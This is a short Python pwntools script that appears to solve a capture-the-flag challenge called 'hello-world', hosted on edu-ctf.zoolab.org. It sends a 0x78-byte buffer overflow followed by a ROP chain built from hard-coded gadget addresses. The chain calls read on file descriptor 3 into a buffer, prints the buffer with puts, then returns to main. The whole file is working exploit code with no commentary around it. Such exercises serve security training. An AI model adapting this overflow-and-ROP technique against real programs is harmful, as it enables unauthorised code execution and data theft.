from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'amd64'

if args['R']:
    r = remote('edu-ctf.zoolab.org', 30212)
else:
    r = process('./hello-world')

elf = ELF('hello-world')

pop_rdi_ret = 0x4013a3
pop_rsi_pop_r15_ret = 0x4013a1
pop_rdx_ret = 0x40176f
read = elf.sym['read']
puts = elf.sym['puts']
main = elf.sym['main']
buf = 0x404500

ROP = flat(
    pop_rdi_ret, 3,
    pop_rsi_pop_r15_ret, buf, 0,
    read,
    pop_rdi_ret, buf,
    puts, main
)

# gdb.attach(r)
r.send('\xff')
r.sendline(b'A'*0x78 + ROP)

r.interactive()